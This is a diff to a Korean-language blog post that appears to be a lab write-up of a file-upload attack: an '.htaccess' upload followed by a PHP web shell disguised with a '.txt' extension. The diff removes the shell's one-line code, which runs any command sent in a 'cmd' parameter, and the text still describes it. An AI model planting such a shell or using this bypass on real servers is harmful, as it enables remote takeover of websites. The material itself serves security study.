@@ -19,9 +19,7 @@ categories: jekyll update
 <p>index페이지에서 '.htaccess'파일을 업로드합니다.</p>
 <img src="/assets/images/11/5.png" style="max-width: 100%; height: auto;">
 <p>그 후 다시 index페이지로 돌아와 '.txt' 확장자로 변조 한 php 웹쉘을 업로드합니다.</p>
-<pre style="background-color: #f4f4f4; padding: 10px; border-radius: 6px; overflow-x: auto; margin-top: 10px;"><code style="font-family: Consolas, Monaco, monospace; color: #333;"><?php
-	system($_GET['cmd']);
-?></code></pre>
+<img src="/assets/images/11/5-2.png" style="max-width: 100%; height: auto;">
 <p>웹 쉘은 간단하게 system함수를 이용하여 GET메소드로 cmd파라미터로 받은 명령어를 실행하도록했습니다.</p>
 
 <img src="/assets/images/11/6.png" style="max-width: 100%; height: auto;">
